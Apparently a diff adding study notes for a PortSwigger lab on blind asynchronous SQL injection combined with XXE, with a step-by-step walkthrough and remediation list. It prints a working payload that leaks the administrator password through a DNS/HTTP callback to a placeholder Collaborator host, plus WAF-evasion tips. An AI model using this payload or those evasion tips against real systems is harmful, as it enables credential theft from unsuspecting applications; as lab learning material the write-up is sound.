@@ -2284,3 +2284,133 @@ Block outbound DNS/HTTP except internal resolvers.
 Detect SQL + XXE hybrid payloads.
 
 ---
+
+# Lab-13 Blind Asynchronous SQL Injection + XXE OAST Password Exfiltration (PortSwigger Lab)
+
+---
+
+## 🔹 One-line summary
+Blind asynchronous SQL injection combined with XXE allows exfiltration of the administrator password via an out-of-band DNS/HTTP interaction (Burp Collaborator).
+
+---
+
+## 🔹 What is this topic? (short)
+This lab demonstrates an SQL injection that:
+- executes **asynchronously**
+- produces **no visible errors**
+- produces **no timing differences**
+- produces **no boolean response changes**
+
+Because nothing appears in the HTTP response, we use **OAST (Out-of-Band Application Security Testing)**.
+
+The injection triggers Oracle’s XML parser to load an external entity whose URL contains the extracted password.  
+The database performs a DNS/HTTP lookup to the Collaborator server → leaking the password.
+
+---
+
+## 🔹 Why this matters (real-world risk)
+Real applications frequently:
+- run SQL in background workers
+- suppress SQL errors
+- block timing attacks
+- hide query output
+
+Attackers can still exfiltrate:
+- passwords  
+- API keys  
+- auth tokens  
+- secret keys  
+- entire DB rows  
+
+All through DNS or HTTP callbacks.
+
+This bypasses WAFs, error suppression, async execution, and timing protection.
+
+---
+
+## 🔹 High-value injection points
+- Tracking cookies  
+- Analytics parameters  
+- Logging systems  
+- Background job triggers  
+- Reporting endpoints  
+- Email rendering paths  
+- Scheduled SQL batch procedures  
+
+These are usually unmonitored and perfect for OAST SQLi.
+
+---
+
+## 🔹 Quick concept checklist
+- Async SQLi = no in-response signals  
+- Use XML + SQL to load external entity  
+- Append sensitive value into DNS subdomain  
+- Collaborator receives DNS/HTTP → proof + data  
+- Oracle functions: `xmltype()`, `EXTRACTVALUE()`  
+
+---
+
+## 🔹 Lab walkthrough — exact steps (copy-paste ready)
+
+1. **Intercept a request containing the `TrackingId` cookie**  
+   In Burp → Proxy → Intercept → send request to Repeater.
+
+2. **Replace TrackingId value with the OAST-XXE SQLi payload**  
+   Payload format:
+   TrackingId=x'+UNION+SELECT+EXTRACTVALUE( xmltype( '<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'
+|| (SELECT password FROM users WHERE username=''administrator'')
+|| '.BURP-COLLABORATOR-SUBDOMAIN/"> %remote; ]>' ), '/l') FROM dual--
+
+3. **Insert Collaborator payload**  
+In Burp:  
+Right-click → Insert Collaborator payload → replaces `BURP-COLLABORATOR-SUBDOMAIN`.
+
+4. **Send the request**  
+The backend SQL runs asynchronously. No visible change in HTTP response.
+
+5. **Poll Collaborator**  
+Burp → Collaborator → Poll  
+DNS/HTTP interaction appears.  
+The password is inside the subdomain of the incoming request.
+
+6. **Log in using the leaked credentials**  
+Username: `administrator`  
+Password: *(value received in Collaborator)*  
+
+Lab solved.
+
+---
+
+## 🧾 Evidence (Screenshots)
+
+1️⃣ **Screenshot — Collaborator shows DNS/HTTP hit containing admin password**  
+![Collaborator DNS/HTTP hit](../images/password-exfiltrated-dns.png)
+
+---
+
+## 🔹 PoC payload (final working injection)
+x'+UNION+SELECT+EXTRACTVALUE( xmltype('<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'
+|| (SELECT password FROM users WHERE username=''administrator'')
+|| '.COLLAB/"> %remote; ]>'), '/l') FROM dual--
+
+(Replace `COLLAB` with your actual Collaborator payload.)
+
+---
+
+## 🔹 Troubleshooting
+- No DNS lookup → Collaborator payload inserted incorrectly  
+- XML errors → non-Oracle DB, try DB-specific XXE approach  
+- No interaction → query filtered or sanitized; try double-encoding  
+- WAF blocks UNION → try JOIN or SELECT FROM DUAL only  
+- Slow poll → async jobs may take 2–10 seconds  
+
+---
+
+## 🔹 Fixes / remediation
+- Use prepared statements  
+- Disable XML external entity resolution  
+- Block outbound DNS except internal resolvers  
+- Restrict Oracle functions (`xmltype`, `EXTRACTVALUE`)  
+- Add WAF rules detecting XXE-in-SQL patterns  
+
+---
